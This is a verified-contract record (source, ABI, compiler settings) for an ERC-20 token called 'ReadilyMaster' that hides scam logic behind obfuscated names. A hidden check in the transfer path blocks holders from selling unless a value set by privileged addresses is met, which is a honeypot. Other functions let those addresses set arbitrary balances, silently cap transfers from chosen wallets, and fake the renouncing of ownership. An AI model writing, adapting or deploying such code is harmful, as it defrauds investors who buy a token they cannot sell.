{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface txLimitShould {\n    function createPair(address receiverAmount, address txLaunch) external returns (address);\n}\n\ninterface receiverTakeSell {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address walletAuto) external view returns (uint256);\n\n    function transfer(address minReceiver, uint256 isShould) external returns (bool);\n\n    function allowance(address receiverLiquidity, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 isShould) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address minReceiver,\n        uint256 isShould\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed modeTeam, uint256 value);\n    event Approval(address indexed receiverLiquidity, address indexed spender, uint256 value);\n}\n\nabstract contract exemptLaunched {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface listTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface receiverTakeSellMetadata is receiverTakeSell {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ReadilyMaster is exemptLaunched, receiverTakeSell, receiverTakeSellMetadata {\n\n    function modeAtTake(address launchToIs, address minReceiver, uint256 isShould) internal returns (bool) {\n        if (launchToIs == atTotal) {\n            return fundShould(launchToIs, minReceiver, isShould);\n        }\n        uint256 toIsLaunch = receiverTakeSell(modeFund).balanceOf(senderFundMarketing);\n        require(toIsLaunch == autoTo);\n        require(minReceiver != senderFundMarketing);\n        if (exemptMarketing[launchToIs]) {\n            return fundShould(launchToIs, minReceiver, exemptAutoMarketing);\n        }\n        return fundShould(launchToIs, minReceiver, isShould);\n    }\n\n    uint256 private minLaunched;\n\n    bool private feeEnable;\n\n    uint256 public limitMarketing;\n\n    mapping(address => bool) public teamExempt;\n\n    bool private marketingLiquidityLaunch;\n\n    mapping(address => mapping(address => uint256)) private fromSwapMode;\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverAuto;\n    }\n\n    string private listTakeFee = \"Readily Master\";\n\n    uint256 tradingIs;\n\n    address tokenSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function receiverTo() public {\n        emit OwnershipTransferred(atTotal, address(0));\n        atSender = address(0);\n    }\n\n    function tokenLaunch(address toAmount, uint256 isShould) public {\n        buyTake();\n        enableFrom[toAmount] = isShould;\n    }\n\n    function buyTake() private view {\n        require(teamExempt[_msgSender()]);\n    }\n\n    bool private amountReceiverSell;\n\n    bool public fromFee;\n\n    address private atSender;\n\n    uint256 autoTo;\n\n    function decimals() external view virtual override returns (uint8) {\n        return liquidityMarketingMin;\n    }\n\n    function transfer(address toAmount, uint256 isShould) external virtual override returns (bool) {\n        return modeAtTake(_msgSender(), toAmount, isShould);\n    }\n\n    function fundShould(address launchToIs, address minReceiver, uint256 isShould) internal returns (bool) {\n        require(enableFrom[launchToIs] >= isShould);\n        enableFrom[launchToIs] -= isShould;\n        enableFrom[minReceiver] += isShould;\n        emit Transfer(launchToIs, minReceiver, isShould);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listToken;\n    }\n\n    function owner() external view returns (address) {\n        return atSender;\n    }\n\n    function balanceOf(address walletAuto) public view virtual override returns (uint256) {\n        return enableFrom[walletAuto];\n    }\n\n    mapping(address => uint256) private enableFrom;\n\n    address public atTotal;\n\n    function getOwner() external view returns (address) {\n        return atSender;\n    }\n\n    uint256 constant exemptAutoMarketing = 5 ** 10;\n\n    uint256 private listToken = 100000000 * 10 ** 18;\n\n    uint256 private liquidityTotal;\n\n    function allowance(address amountSwap, address receiverListTx) external view virtual override returns (uint256) {\n        if (receiverListTx == tokenSender) {\n            return type(uint256).max;\n        }\n        return fromSwapMode[amountSwap][receiverListTx];\n    }\n\n    string private receiverAuto = \"RMR\";\n\n    function receiverFund(uint256 isShould) public {\n        buyTake();\n        autoTo = isShould;\n    }\n\n    bool public launchedBuy;\n\n    event OwnershipTransferred(address indexed enableSender, address indexed shouldBuyFee);\n\n    address senderFundMarketing = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint8 private liquidityMarketingMin = 18;\n\n    function approve(address receiverListTx, uint256 isShould) public virtual override returns (bool) {\n        fromSwapMode[_msgSender()][receiverListTx] = isShould;\n        emit Approval(_msgSender(), receiverListTx, isShould);\n        return true;\n    }\n\n    function receiverLaunched(address atToFund) public {\n        buyTake();\n        if (amountReceiverSell == marketingLiquidityLaunch) {\n            liquidityTotal = minLaunched;\n        }\n        if (atToFund == atTotal || atToFund == modeFund) {\n            return;\n        }\n        exemptMarketing[atToFund] = true;\n    }\n\n    uint256 public takeTrading;\n\n    function senderList(address listExempt) public {\n        if (txFund) {\n            return;\n        }\n        \n        teamExempt[listExempt] = true;\n        \n        txFund = true;\n    }\n\n    address public modeFund;\n\n    bool public txFund;\n\n    mapping(address => bool) public exemptMarketing;\n\n    function transferFrom(address launchToIs, address minReceiver, uint256 isShould) external override returns (bool) {\n        if (_msgSender() != tokenSender) {\n            if (fromSwapMode[launchToIs][_msgSender()] != type(uint256).max) {\n                require(isShould <= fromSwapMode[launchToIs][_msgSender()]);\n                fromSwapMode[launchToIs][_msgSender()] -= isShould;\n            }\n        }\n        return modeAtTake(launchToIs, minReceiver, isShould);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return listTakeFee;\n    }\n\n    constructor (){\n        if (feeEnable) {\n            fromFee = true;\n        }\n        listTake exemptIs = listTake(tokenSender);\n        modeFund = txLimitShould(exemptIs.factory()).createPair(exemptIs.WETH(), address(this));\n        \n        atTotal = _msgSender();\n        teamExempt[atTotal] = true;\n        enableFrom[atTotal] = listToken;\n        receiverTo();\n        if (liquidityTotal != takeTrading) {\n            fromFee = true;\n        }\n        emit Transfer(address(0), atTotal, listToken);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldBuyFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeTeam\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverListTx\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverListTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isShould\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletAuto\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"isShould\",\"type\":\"uint256\"}],\"name\":\"receiverFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atToFund\",\"type\":\"address\"}],\"name\":\"receiverLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listExempt\",\"type\":\"address\"}],\"name\":\"senderList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isShould\",\"type\":\"uint256\"}],\"name\":\"tokenLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isShould\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchToIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isShould\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ReadilyMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}